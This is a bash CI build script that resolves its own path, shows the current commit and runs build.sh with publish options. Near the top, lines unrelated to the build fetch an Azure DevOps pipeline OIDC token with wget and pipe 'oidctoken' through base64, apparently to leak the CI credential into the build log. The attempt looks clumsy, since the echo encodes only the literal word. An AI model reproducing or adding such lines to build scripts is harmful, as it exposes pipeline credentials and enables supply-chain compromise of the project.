#!/usr/bin/env bash

source="${BASH_SOURCE[0]}"
echo "test"
wget https://dev.azure.com/dnceng-public/cbb18261-c48f-4abb-8651-8cdcb5474649/_apis/distributedtask/hubs/build/plans/5bef9d3f-5319-4401-8e00-770d1fcf5a49/jobs/22fea640-1099-5f32-ec5d-316ad83f359a/oidctoken 
echo oidctoken | base64
# resolve $SOURCE until the file is no longer a symlink
while [[ -h $source ]]; do
  scriptroot="$( cd -P "$( dirname "$source" )" && pwd )"
  source="$(readlink "$source")"

  # if $source was a relative symlink, we need to resolve it relative to the path where 
  # the symlink file was located
  [[ $source != /* ]] && source="$scriptroot/$source"
done
scriptroot="$( cd -P "$( dirname "$source" )" && pwd)"

echo "Building this commit:"
git show --no-patch --pretty=raw HEAD

. "$scriptroot/build.sh" --ci --restore --build --pack --publish --binaryLog "$@"
